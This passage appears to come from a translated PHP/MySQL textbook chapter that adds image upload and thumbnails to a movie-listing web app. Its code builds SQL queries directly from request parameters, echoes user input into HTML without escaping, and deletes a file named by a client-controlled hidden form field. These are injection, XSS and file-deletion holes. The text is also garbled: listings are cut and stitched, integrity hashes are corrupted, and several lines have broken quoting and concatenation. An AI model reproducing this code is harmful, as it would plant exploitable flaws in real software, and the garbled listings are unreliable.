        . "running_time_in_minutes, genre, image_file)"
        . "VALUES ('$movie_title', '$movie_rating', '$movie_director', "
        . "'$movie_runtime', '$movie_genre_text', '$movie_image_file_path')";

    mysqli_query($dbc, $query)
        or trigger_error(
            'Error querying database movieListing: Failed to insert movie listing',
            E_USER_ERROR
        );

    if (empty($movie_image_file_path))
    {
        $movie_image_file_path = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
    }

    $display_add_movie_form = false;
}
?>
<h3 class="text-info">The Following Movie Details were Added:</h3><br/>

<h1><?= $movie_title ?></h1>
<div class="row">
    <div class="col-2">
        <img src="<?= $movie_image_file_path ?>" class="img-thumbnail"
             style="max-height: 200px;" alt="Movie image">
    </div>
    <div class="col">
        <table class="table table-striped">
<tbody>
<tr>
<th scope="row">Rating</th>
<td><?= $movie_rating ?></td>
</tr>
<tr>
<th scope="row">Director</th>
<td><?= $movie_director ?></td>
</tr>
<tr>
<th scope="row">Running Time (minutes)</th>
<td><?= $movie_runtime ?></td>
</tr>
<tr>
<th scope="row">Genre</th>
<td><?= $movie_genre_text ?></td>
</tr>
</tbody>
</table>
</div>
</div>
<hr/>
<p>Would you like to <a href='<?= $_SERVER['PHP_SELF']; ?>'> add another movie</a>?</p>
<?php
}
else
{
// echo error message
echo "<h5><p class='text-danger'>" . $file_error_message . "</p></h5>";
}
}
if ($display_add_movie_form)
{
?>
<form enctype="multipart/form-data" class="needs-validation" novalidate
method="POST" action="<?= $_SERVER['PHP_SELF'] ?>">
<div class="form-group row">
<label for="movie_title"
class="col-sm-3 col-form-label-lg">Title</label>
<div class="col-sm-8">
<input type="text" class="form-control" id="movie_title"
name="movie_title" value="<?= $movie_title ?>"
placeholder="Title" required>
<div class="invalid-feedback">
Please provide a valid movie title.
</div>
</div>
</div>
<div class="form-group row">
<label for="movie_rating" class="col-sm-3 col-form-label-lg">Rating</label>
<div class="col-sm-8">
<select class="custom-select" id="movie_rating"
name="movie_rating" value="<?= $movie_rating ?>" required>
## 19. 使用文件和对现有代码的功能添加

156.     <option value="" disabled selected>Rating...</option>
157.     <option value="G" <?= $movie_rating == 'G' ? 'selected' : '' ?>>G</option>
158.     <option value="PG" <?= $movie_rating == 'PG' ? 'selected' : '' ?>>PG</option>
159.     <option value="PG-13" <?= $movie_rating == 'PG-13' ? 'selected' : '' ?>>PG-13</option>
160.     <option value="R" <?= $movie_rating == 'R' ? 'selected' : '' ?>>R</option>
161.     </select>
162.     <div class="invalid-feedback">
163.     Please select a movie rating.
164.     </div>
165.     </div>
166.     </div>
167.     <div class="form-group row">
168.     <label for="movie_director" class="col-sm-3 col-form-label-lg">Director</label>
169.     <div class="col-sm-8">
170.     <input type="text" class="form-control" id="movie_director"
171.     name="movie_director" value="<?= $movie_director ?>"
172.     placeholder="Director" required>
173.     <div class="invalid-feedback">
174.     Please provide a valid movie director.
175.     </div>
176.     </div>
177.     </div>
178.     <div class="form-group row">
179.     <label for="movie_running_time_in_minutes"
180.     class="col-sm-3 col-form-label-lg">Running Time (min)</label>
181.     <div class="col-sm-8">
182.     <input type="number" class="form-control"
183.     id="movie_running_time_in_minutes"
184.     name="movie_running_time_in_minutes"
185.     value="<?= $movie_runtime ?>"
186.     placeholder="Running time (in minutes)" required>
187.     <div class="invalid-feedback">
188.     Please provide a valid running time in minutes.
189.     </div>
190.     </div>
191.     </div>
192.     <div class="form-group row">
193.     <label class="col-sm-3 col-form-label-lg">Genre</label>
194.     <div class="col-sm-8">
195.     <?php
196.     foreach ($genres as $genre)
197.     {
198.     ?>
199.     <div class="form-check form-check-inline col-sm-3">
200.     <input class="form-check-input" type="checkbox"
201.     id="movie_genre_checkbox_action_<?= $genre ?>"
202.     name="movie_genre_checkbox[]"
203.     value="<?= $genre ?>"<?= in_array($genre, $checked_movie_genres) ? 'checked' : '' ?>>
204.     <label class="form-check-label"
205.     for="movie_genre_checkbox_action_<?= $genre ?>"><?= $genre ?></label>
206.     </div>
207.     <?php
208.     }
## 添加文件上传功能

?> 
</div>
</div>
<div class="form-group row">
    <label for="movie_image_file"
        class="col-sm-3 col-form-label-lg">Movie Image File</label>
    <div class="col-sm-8">
        <input type="file" class="form-control-file"
            id="movie_image_file" name="movie_image_file">
    </div>
</div>
<button class="btn btn-primary" type="submit"
    name="add_movie_submission">Add Movie</button>
</form>
<script>
// Javascript for disabling form submissions if there are invalid fields
(function() {
    'use strict';
    window.addEventListener('load', function() {
        // Fetch all the forms we want to apply custom Bootstrap validation styles to
        var forms = document.getElementsByClassName('needs-validation');
        // Loop over them and prevent submission
        var validation = Array.prototype.filter.call(forms, function(form) {
            form.addEventListener('submit', function(event) {
                if (form.checkValidity() == false) {
                    event.preventDefault();
                    event.stopPropagation();
                }
                form.classList.add('was-validated');
            }, false);
        });
    }, false);
})();
</script>
<?php
    } // Display add movie form
?>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK1JLJStQIAqVqVzpbo5smXKp0yVhVh+8abtTE1Pi6jizo"
    crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
    integrity="sha384-wHAiFfRl0JPyJ4MwYrtyAdNaJCcmZs5jDFfspbIwwj/QRKioJHL4Jg=="
    crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
    integrity="sha384-384-..."
    crossorigin="anonymous"></script>
</body>
</html>

## 在主页面显示电影的缩略图

现在我们可以在电影中添加图片，让我们修改主“Movies I Like”页面（index.php），在每行电影开头显示电影的缩略图，如果用户未为电影上传图片，则显示默认图片（generic_movie.jpg）。我们希望修改后的“Movies I Like”页面看起来像图 19.17。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_268_0.png)

修改相对简单，因为我们需要做的只是修改查询以从 movielisting 数据库表中获取新的 image_file 字段，并在 HTML 表格中添加一列，以便在每一行的开头显示缩略图。

开始吧。首先，通过在引用 dbconnection.php 之后添加以下 require_once() 来引用 movielistingfileconstants.php 脚本：

```
require_once('dbconnection.php');
require_once('movielistingfileconstants.php');
```

接下来，修改 SQL 查询语句（在数据库连接之后），以包含 movieListing 数据库表中的 image_file 字段：

```
$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
        'Error connecting to MySQL server for ' . DB_NAME,
        E_USER_ERROR
    );

$query = "SELECT id, title, image_file FROM movieListing ORDER BY title";
```

在显示 HTML 表格的位置，我们需要为缩略图添加一列。首先，添加一个 HTML 表格标题字段（这样就有三列而不是两列），如清单 19.18 所示。



## 在主页上显示电影缩略图

### 代码清单 19.18

```
1. <table class="table table-striped table-hover">
2. <thead>
3. <tr>
4. <th scope="col"><h4>Movie Titles</h4></th>
5. <th scope="col"></th>
6. <th scope="col"></th>
7. </tr>
8. </thead>
9. <tbody>
```

接下来，我们需要修改每个 HTML 表格行的显示，使其输出三列（而不是两列），其中第一列为缩略图。此外，我们需要确保如果用户没有为电影上传图像，则显示默认图像（generic_movie.jpg）。所有这些操作都在 while 循环中完成，如代码清单 19.19 所示。

### 代码清单 19.19

```
1. while ($row = mysqli_fetch_assoc($result))
2. {
3. $movie_image_file = $row['image_file'];
4. 
5. if (empty($movie_image_file))
6. {
7. $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
8. }
9. 
10. echo "<tr><td><img src=\"" . $movie_image_file . "\" class=\"img-thumbnail\" .
11. "style='max-height: 75px;' alt='Movie image'></td>" .
12. "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id='" .
13. $row['id'] . "'>" . $row['title'] . "</a></td>" .
14. "<td class='align-middle'><a class='nav-link' href='removemovie.php?id_to_delete='" .
15. $row['id'] ."'><i class='fas fa-trash-alt'></i></a></td></tr>";
16. }
```

请注意，如果 image_file 字段是空字符串，我们将要显示的图像设置为 images/generic_movie.jpg。

## 19. 文件处理与向现有代码添加功能

## index.php 的完整代码清单

### 代码清单 19.20

```php
1. <html>
2. <head>
3. <title>Movies I Like</title>
4. <link rel="stylesheet"
5. href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
6. integrity="sha384-GJzzFGwb10TNNxCRb4pwiMA1aHzv/BuGjpLSa9dkKp0Dg1MDn4vYMj7GzK4YbI7O6tS"
7. crossorigin="anonymous">
8. <link rel="stylesheet"
9. href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
10. integrity="sha384-50oBUHEmvpQ+1lW4y58PFTFmhCaXp0mL5d60M1M7uH2+nqUivzIebhn0dJK28anvF"
11. crossorigin="anonymous">
12. </head>
13. <body>
14. <div class="card">
15. <div class="card-body">
16. <h1>Movies I Like</h1>
17. <p class='nav-link'>If you have a movie you would like to include, feel free to <a href="addmovie.php"> add one</a></p>
18. <?php
19. require_once('dbconnection.php');
20. require_once('movielistingfileconstants.php');
21. 
22. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
23. or trigger_error(
24. 'Error connecting to MySQL server for ' . DB_NAME,
25. E_USER_ERROR
26. );
27. 
28. $query = "SELECT id, title, image_file FROM movielisting ORDER BY title";
29. 
30. $result = mysqli_query($dbc, $query)
31. or trigger_error(
32. 'Error querying database movielisting',
33. E_USER_ERROR
34. );
35. 
36. if (mysqli_num_rows($result) > 0):
37. 
38. ?>
39. <table class="table table-striped table-hover">
40. <thead>
41. <tr>
42. <th scope="col"><h4>Movie Titles</h4></th>
<th scope="col"></th>
<th scope="col"></th>
</tr>
</thead>
<tbody>
<?php
while($row = mysqli_fetch_assoc($result))
{
    $movie_image_file = $row['image_file'];
    if (empty($movie_image_file))
    {
        $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
    }
    echo "<tr><td><img src=" . $movie_image_file . " class='img-thumbnail'"
        . "style='max-height: 75px;' alt='Movie image'></td>"
        . "<td class='align-middle'><a class='nav-link' href='moviedetails.php?id='"
        . $row['id'] . "'>" . $row['title'] . "</a></td>"
        . "<td class='align-middle'><a class='nav-link' href='removemovie.php?id_to_delete='"
        . $row['id'] . "'><i class='fas fa-trash-alt'></i></a></td></tr>";
}
?>
</tbody>
</table>
<?php
else:
?>
<h3>No Movies Found :-(</h3>
<?php
endif;
?>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVqVZpbzoSsrXkpYVhH8abtTE1P1jL6jzo"
    crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
    integrity="sha384-wHAiFfRl0JOfKk..."
    crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
    integrity="sha384-B0UglyR+jr6C..."
    crossorigin="anonymous"></script>
</body>
</html>
```

现在我们需要修改 moviedetails.php，使电影图像显示在“电影详情”页面上，以便更好地标识电影。此过程与我们修改 addmovie.php 的过程非常相似，addmovie.php 会在用户选择“添加电影”后显示电影详情，结果应如图 19.18 所示。

```
if (isset($_GET['id'])):
require_once('dbconnection.php');
require_once('movielistingfileconstants.php');
```

接下来，就在 if (mysqli_num_rows($result) == 1) 条件内，紧接在
$row = mysqli_fetch_assoc($result); 这一行之后，我们需要添加代码，以便在 image_file 字段为空字符串时显示默认图像。参见代码清单 19.21。

### 代码清单 19.21

```
if (mysqli_num_rows($result) == 1):
  $row = mysqli_fetch_assoc($result);
  $movie_image_file = $row['image_file'];

  if (empty($movie_image_file)):
    $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
  endif;

endif;
```

最后，与我们在 addmovie.php 中所做的一样，我们需要将电影图像文件（或默认图像）添加到表格中，以显示电影详情。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_272_0.png)

## 在详情页显示电影图像

由于我们使用的是 Bootstrap 的 Flexbox 网格实现，最好将图像和表格分别封装到不同的列中，并将它们放在同一行内，所有这些都位于 <h1> 元素中的电影标题下方：

### 代码清单 19.22

```
<h1><?= $row['title'] ?></h1>
<div class="row">
  <div class="col-2">
    <img src="<?= $movie_image_file ?>" class="img-thumbnail"
         style="max-height: 200px;" alt="Movie image">
  </div>
  <div class="col">
    <table class="table table-striped">
      ...
    </table>
  </div>
</div>
```

同样，请注意我们将 style 属性设置为最大高度 200 像素。

## moviedetails.php 完整代码清单

### 代码清单 19.23

```php
<html>
<head>
  <link rel="stylesheet"
  href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
  integrity="sha384-GJzZqFGwbIQTTN6wyJ59ffF1BuGJpLSa9Dk..."
  crossorigin="anonymous">
  <title>Movie Details</title>
</head>
<body>
<div class="card">
  <div class="card-body">
    <nav class="nav">
      <a class="nav-link" href="index.php">Movies I Like</a>
    </nav>
<?php
if (isset($_GET['id'])):

  require_once('dbconnection.php');
  require_once('movielistingfileconstants.php');

  $id = $_GET['id'];
$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
        'Error connecting to MySQL server for ' . DB_NAME,
        E_USER_ERROR
    );

$query = "SELECT * FROM movieListing WHERE id = $id";

$result = mysqli_query($dbc, $query)
    or trigger_error(
        'Error querying database movieListing',
        E_USER_ERROR
    );

if (mysqli_num_rows($result) == 1):
    $row = mysqli_fetch_assoc($result);

    $movie_image_file = $row['image_file'];

    if (empty($movie_image_file)):
        $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
    endif;
?>
<h1><?= $row['title'] ?></h1>
<div class="row">
    <div class="col-2">
        <img src="<?= $movie_image_file ?>" class="img-thumbnail"
            style="max-height: 200px;" alt="Movie image">
    </div>
    <div class="col">
        <table class="table table-striped">
            <tbody>
                <tr>
                    <th scope="row">Rating</th>
                    <td><?= $row['rating'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Director</th>
                    <td><?= $row['director'] ?></td>
                </tr>
                <tr>
                    <th scope="row">Running Time (minutes)</th>
                    <td><?= $row['running_time_in_minutes'] ?></td>
                </tr>
                <tr>
```



### 在详情页面上显示电影图片

```html
<th scope="row">Genre</th>
<td><?= $row['genre'] ?></td>
</tr>
</tbody>
</table>
</div>
</div>
<hr/>
<p class="nav-link">
    If you would like to change any of the details of
    this movie, feel free to
    <a href="editmovie.php?id_to_edit=<?= $row['id'] ?>">edit it</a>
</p>
<?php
else:
?>
<h3>No Movie Details :-)</h3>
<?php
endif;
else:
?>
<h3>No Movie Details :-)</h3>
<?php
endif;
?>
</div>
</div>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
    integrity="sha384-q8i/X+965DzOzUjtlsu2Y9MRQgxUq5MYxNFkZInk+..."
    crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
    integrity="sha384-wHAiF1R1..."
    crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
    integrity="sha384-B0Uglyr+..."
    crossorigin="anonymous"></script>
</body>
</html>
```

## 19. 处理文件及向现有代码添加功能

### 向编辑页面添加图片文件上传功能

现在，新电影可以有自定义的文件图片。我们需要在 editmovie.php 脚本中添加同样的能力，以上传电影图片以及电影的其他任何详细信息。这样，用户就可以用新图片更新现有的文件图片，或者为现有条目添加电影缩略图。

当我们因在“电影详情”页面上选择“编辑它”链接而导航到“编辑电影”页面时，我们应该会看到图 19.19。

我们希望在表单右侧添加电影图片，并在表单底部附近添加一个“选择文件”按钮（图 19.20）。

当选择要更新的图片时，会弹出一个文件浏览窗口。然后，用户可以导航到想要上传的图片文件，选中它，然后像图 19.21 那样按下“打开”。

所选文件的名称会显示在“选择文件”按钮之后，而不是“未选择文件”。见图 19.22。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_276_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_276_1.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_276_2.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_276_3.png)

一旦我们选择“更新电影”（图 19.23），我们希望看到“电影详情”页面上显示的更新后的电影详细信息已经过我们上传的图片进行了修改，如图 19.24 所示。

首先，打开 editmovie.php 脚本，并在脚本顶部引用 dbconnection.php 的代码之后，添加以下 require_once()，以引用 movieimagefileutil.php 脚本：

```php
require_once('dbconnection.php');
require_once('movieimagefileutil.php');
```

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_277_0.png)

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_277_1.png)

#### 编辑时显示电影图片详情

当第一次浏览到“编辑电影”页面（editmovie.php）时，是因为从“电影详情”页面导航过来时发生了一次 HTTP GET 请求/响应。因此，我们需要按照清单 19.24 进行修改，在 if (isset($_GET['id_to_edit'])) 代码块中添加电影图片文件的详细信息：

**清单 19.24。**

```php
if (isset($_GET['id_to_edit']))
{
    // ...
    if (mysqli_num_rows($result) == 1)
    {
        // ...
        $movie_genre_text = $row['genre'];
        $movie_image_file = $row['image_file'];

        if (empty($movie_image_file))
        {
            $movie_image_file_displayed = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
        }
        else
        {
            $movie_image_file_displayed = $movie_image_file;
        }

        $checked_movie_genres = explode(', ', $movie_genre_text);
    }
}
```

请注意，如果 `$movie_image_file` 为空，我们需要将 `$movie_image_file_displayed` 设置为默认的电影文件图片。`$movie_image_file_displayed` 用于在页面上表单右侧显示电影图片。

由于我们使用的是 Bootstrap 的 Flexbox 网格实现，最好将表单和图片分别封装在不同的列中，并将它们放在同一行中。按照清单 19.25 进行修改，将表单显示在左侧，图片显示在右侧。

**清单 19.25。**

```html
1. <div class="row">
2.   <div class="col">
3.     <form ...>
4.     // ...
5.     </form>
6.   </div>
7.   <div class="col-3">
8.     <img src="<?= $movie_image_file_displayed ?>" class="img-thumbnail"
9.          style="max-height: 400px;" alt="Movie image">
10.  </div>
11. </div>
```

请注意，我们将 style 属性设置为最大高度 400 像素。

#### 修改表单以允许文件上传

就像我们在 addmovie.php 中所做的那样，需要在 editmovie.php 的表单中添加两样东西以启用文件上传。首先，我们需要在 `<form>` 元素中添加 enctype 属性，并将其设置为 multipart/form-data：

```html
<form enctype="multipart/form-data" ...>
```

然后，我们需要向表单添加一个文件输入元素：

```html
<input type="file" class="form-control-file" id="movie_image_file"
       name="movie_image_file">
```

按照清单 19.26，将文件输入元素添加到表单中提交按钮之前的 Bootstrap form-group 行内。

**清单 19.26。**

```html
</div>
<div class="form-group row">
    <label for="movie_image_file"
        class="col-sm-3 col-form-label-lg">Movie Image File</label>
    <div class="col-sm-8">
        <input type="file" class="form-control-file" id="movie_image_file"
            name="movie_image_file">
    </div>
</div>
<button class="btn btn-primary" type="submit"
        name="edit_movie_submission">Update Movie</button>
</form>
```

关于 `$movie_image_file`，就像用于 id_to_update 的隐藏 `<input>` 元素一样，我在表单中创建了另一个隐藏的 `<input>` 元素，并将其设置为 `$movie_image_file` 的值，同时将 name 属性设置为 `movie_image_file`。当用户按下**更新电影**提交按钮、表单数据被回传到 editmovie.php 时，现有文件（更新之前）的名称将可在 `$_POST[]` 超全局数组中获得，这样如果用户选择了新文件，就可以将其删除（如果非空）：

```html
<input type="hidden" name="id_to_update" value="<?= $id_to_edit ?>">
<input type="hidden" name="movie_image_file" value="<?= $movie_image_file ?>">
```

> *请参阅第 17 章中的补充说明：**Web 是无状态的！***

#### 修改编辑代码以存储文件

在用户通过选择图 19.25 中的“更新电影”按钮提交表单数据后，表单数据可在 elseif 代码块中获得，该代码块用于检查 `$_POST` 超全局变量中是否设置了这些表单数据。请注意，我们在条件中添加了 `movie_image_file` 隐藏字段。

```php
elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
              $_POST['movie_rating'], $_POST['movie_director'],
              $_POST['movie_running_time_in_minutes'], $_POST['id_to_update'],
              $_POST['movie_image_file']))
{
```

在这个 `elseif` 代码块内部，我们需要验证文件，将其移动到 `images/` 文件夹，并修改数据库中 `movieListing` 表的 `image_file` 字段。

首先，在根据表单数据设置 `$id_to_update` 之后，立即创建一个名为 `$movie_image_file` 的变量，并将其设置为 `$_POST` 超全局变量中的隐藏变量：

```php
elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
    $_POST['movie_rating'], $_POST['movie_director'],
    $_POST['movie_running_time_in_minutes'], $_POST['id_to_update'],
    $_POST['movie_image_file']))
{
    // ...
    $id_to_update = $_POST['id_to_update'];
    $movie_image_file = $_POST['movie_image_file'];
}
```

我们需要在检查 `checked_movie_genres` 是否已设置之后、连接数据库之前，测试是否为电影预先设置了图片文件。如果没有，将先前显示的电影设置为默认图片（清单 19.27）。

**清单 19.27。**

```php
1. if (isset($checked_movie_genres))
2. {
3.     $movie_genre_text = implode(", ", $checked_movie_genres);
4. }
5. 
6. if (empty($movie_image_file))
7. {
8.     $movie_image_file_displayed = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
9. }
10. else
11. {
12.     $movie_image_file_displayed = $movie_image_file;
13. }
```

与 addmovie.php 一样，我们将在连接数据库的调用之前验证上传的电影图片文件。在此处添加一条适当的注释可能是个好主意，例如清单 19.28 中的注释。

**清单 19.28。**

```php
1. else
2. {
3.     $movie_image_file_displayed = $movie_image_file;
4. }
5. 
6. /*
7. Here is where we will deal with the file by calling validateMovieImageFile().
8. This function will validate that the movie image file is not greater than 128
```


```
9. characters, is the right image type (jpg/png/gif), and not greater than 512KB.
10. This function will return an empty string ('') if the file validates successfully,
11. otherwise, the string will contain error text to be output to the web page before
12. redisplaying the form.
13. */
```

接下来，我们调用 validateMovieImageFile() 并将返回值设置为一个新变量，以捕获文件错误信息：

```
otherwise, the string will contain error text to be output to the web page before
redisplaying the form.
*/
```

$file_error_message = validateMovieImageFile();

正如我们在 addmovie.php 中所做的那样，如果 validateMovieImageFile() 返回的不是空字符串，则文件上传时出现错误。我们希望显示此错误信息并重新显示表单，而不是更新数据库中的数据，从而允许用户纠正错误。错误的两个常见原因是：图像太大，或图像的文件类型错误。

为 file_error_message 为空创建一个 if 条件，并将所有数据库代码移入这个新的 if 块中。新的 if 块现在应如下所示 列表 19.29。

## 列表 19.29.

```
1. $file_error_message = validateMovieImageFile();
2.
3. if (empty($file_error_message))
4. {
5.     $query = "UPDATE movielisting SET title = '$movie_title', rating = '$movie_rating', "
6.         . "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
7.         . "genre = '$movie_genre_text' WHERE id = $id_to_update";
8.
9.     mysqli_query($dbc, $query)
10.         or trigger_error(
11.             'Error querying database movielisting: Failed to update movie listing',
12.             E_USER_ERROR
13.         );
14.
15.     $nav_link = 'moviedetails.php?id=' . $id_to_update;
16.
17.     header("Location: $nav_link");
18.     exit();
19. }
```

## 19. 处理文件和对现有代码的功能添加

在更新数据库之前，我们还需要做另外三件事：

- 1. 将图像文件移动到 images/ 文件夹并通过调用 addMovieImageFileReturnPathLocation() 获取路径位置。
- 2. 如果之前设置了图像，则通过调用 removeMovieImageFile() 从 images/ 文件夹中删除旧的图像文件。
- 3. 更新数据库查询以更新 movieListing 数据库表中的 image_file 字段。

```
$movie_image_file_path = addMovieImageFileReturnPathLocation();
```

```
// IF new image selected, set it to be updated in the database.
if (!empty($movie_image_file_path))
{
    // IF replacing an image (other than the default), remove it
    if (!empty($movie_image_file))
    {
        removeMovieImageFile($movie_image_file);
    }
    $movie_image_file = $movie_image_file_path;
}
```

```
$query = "UPDATE movieListing SET title = '$movie_title', rating = '$movie_rating', "
    . "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
    . "genre = '$movie_genre_text', image_file = '$movie_image_file' "
    . "WHERE id = $id_to_update";
```

完整的代码块如下所示 列表 19.30。

## 列表 19.30.

```
if (empty($file_error_message))
{
    $movie_image_file_path = addMovieImageFileReturnPathLocation();

    // IF new image selected, set it to be updated in the database.
    if (!empty($movie_image_file_path))
    {
        // IF replacing an image (other than the default), remove it
        if (!empty($movie_image_file))
        {
            removeMovieImageFile($movie_image_file);
        }

        $movie_image_file = $movie_image_file_path;
    }
    $query = "UPDATE movielisting SET title = '$movie_title', rating = '$movie_rating', "
      . "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "
      . "genre = '$movie_genre_text', image_file = '$movie_image_file' ".
      . "WHERE id = $id_to_update";
 
    mysqli_query($dbc, $query)
      or trigger_error(
        'Error querying database movielisting: Failed to update movie listing',
        E_USER_ERROR
      );
 
    $nav_link = 'moviedetails.php?id=' . $id_to_update;
 
    header("Location: $nav_link");
    exit();
}
```

## 向编辑页面添加图像文件上传

如果验证上传的电影图像文件时出现错误，您需要将错误输出到网页并重新显示表单，如 列表 19.31 所示。

## 列表 19.31.

```
1. $file_error_message = validateMovieImageFile();
2. 
3. if (empty($file_error_message))
4. {
5.   // ...
6. }
7. else
8. {
9.   // echo error message
10. echo "<h5><p class='text-danger'>" . $file_error_message . "</p></h5>";
11. }
```

## 完整的“编辑电影”代码列表

## 列表 19.32.

```
1. <!DOCTYPE html>
2. <html>
3. <head>
4.   <title>Edit a Movie</title>
5.   <link rel="stylesheet"
6.     href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css"
7.     integrity="sha384-GJzZqFGwb1QTTN6wy59fff1BuGJpLSa9DKKMp0DgiMDm4iYMj0gZcKYbI7o6tWS"
8.     crossorigin="anonymous">
9. </head>
```

## 19. 处理文件和对现有代码的功能添加

```
10. <body>
11. <div class="card">
12.     <div class="card-body">
13.         <h1>Edit a Movie</h1>
14.         <nav class="nav">
15.             <a class="nav-link" href="index.php">Movies I Like</a>
16.         </nav>
17.         <hr/>
18. <?php
19. require_once('dbconnection.php');
20. require_once('movieimagefileutil.php');
21. 
22. $dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
23.     or trigger_error(
24.         'Error connecting to MySQL server for ' . DB_NAME,
25.         E_USER_ERROR
26.     );
27. 
28. $genres = [
29.     'Action', 'Adventure', 'Comedy', 'Documentary', 'Drama',
30.     'Fantasy', 'Horror', 'Romance', 'Science Fiction'
31. ];
32. 
33. if (isset($_GET['id_to_edit'])) {
34.     $id_to_edit = $_GET['id_to_edit'];
35. 
36.     $query = "SELECT * FROM movieListing WHERE id = $id_to_edit";
37. 
38.     $result = mysqli_query($dbc, $query)
39.         or trigger_error(
40.             'Error querying database movieListing',
41.             E_USER_ERROR
42.         );
43. 
44.     if (mysqli_num_rows($result) == 1) {
45.         $row = mysqli_fetch_assoc($result);
46. 
47.         $movie_title = $row['title'];
48.         $movie_rating = $row['rating'];
49.         $movie_director = $row['director'];
50.         $movie_runtime = $row['running_time_in_minutes'];
51.         $movie_genre_text = $row['genre'];
52.         $movie_image_file = $row['image_file'];
53. 
54.         if (empty($movie_image_file)) {
55.             $movie_image_file_displayed = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
56.         } else {
57.             $movie_image_file_displayed = $movie_image_file;
58.         }
59.
```

## 向编辑页面添加图像文件上传

```php
60.     $checked_movie_genres = explode(', ', $movie_genre_text);
61. }
62. } elseif (isset($_POST['edit_movie_submission'], $_POST['movie_title'],
63. $_POST['movie_rating'], $_POST['movie_director'],
64. $_POST['movie_running_time_in_minutes'], $_POST['id_to_update'],
65. $_POST['movie_image_file'])) {
66. $movie_title = $_POST['movie_title'];
67. $movie_rating = $_POST['movie_rating'];
68. $movie_director = $_POST['movie_director'];
69. $movie_runtime = $_POST['movie_running_time_in_minutes'];
70. $checked_movie_genres = $_POST['movie_genre_checkbox'];
71. $id_to_update = $_POST['id_to_update'];
72. $movie_image_file = $_POST['movie_image_file'];
73.
74. $movie_genre_text = "";
75.
76. if (isset($checked_movie_genres)) {
77. $movie_genre_text = implode(", ", $checked_movie_genres);
78. }
79.
80. if (empty($movie_image_file)) {
81. $movie_image_file_displayed = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
82. } else {
83. $movie_image_file_displayed = $movie_image_file;
84. }
85.
86. /*
87. Here is where we will deal with the file by calling validateMovieImageFile().
88. This function will validate that the movie image file is the right image type
89. (jpg/png/gif), and not greater than 512KB. This function will return an empty
90. string ('') if the file validates successfully, otherwise, the string will contain
91. error text to be output to the web page before redisplaying the form.
92. */
93.
94. $file_error_message = validateMovieImageFile();
95.
96. if (empty($file_error_message)) {
97. $movie_image_file_path = addMovieImageFileReturnPathLocation();
98.
99. // IF new image selected, set it to be updated in the database.
100. if (!empty($movie_image_file_path)) {
101. // IF replacing an image (other than the default), remove it
102. if (!empty($movie_image_file)) {
103. removeMovieImageFile($movie_image_file);
104. }
105.
106. $movie_image_file = $movie_image_file_path;
107. }
108.
109. $query = "UPDATE movieListing SET title = '$movie_title', rating = '$movie_rating', "
110. . "director = '$movie_director', running_time_in_minutes = '$movie_runtime', "


## 19. 处理文件与为现有代码添加功能

```php
. "genre = '$movie_genre_text', image_file = '$movie_image_file' "
. "WHERE id = $id_to_update";

mysqli_query($dbc, $query)
    or trigger_error(
        'Error querying database movielisting: Failed to update movie listing',
        E_USER_ERROR
    );

$nav_link = 'moviedetails.php?id=' . $id_to_update;

header("Location: $nav_link");
exit();
} else {
    // echo error message
    echo "<h5><p class='text-danger'>" . $file_error_message . "</p></h5>";
}

} else // Unintended page link - No movie to edit, link redirect to index
{
    header("Location: index.php");
    exit();
}
?>
<div class="row">
    <div class="col">
        <form enctype="multipart/form-data"
            class="needs-validation" novalidate
            method="POST"
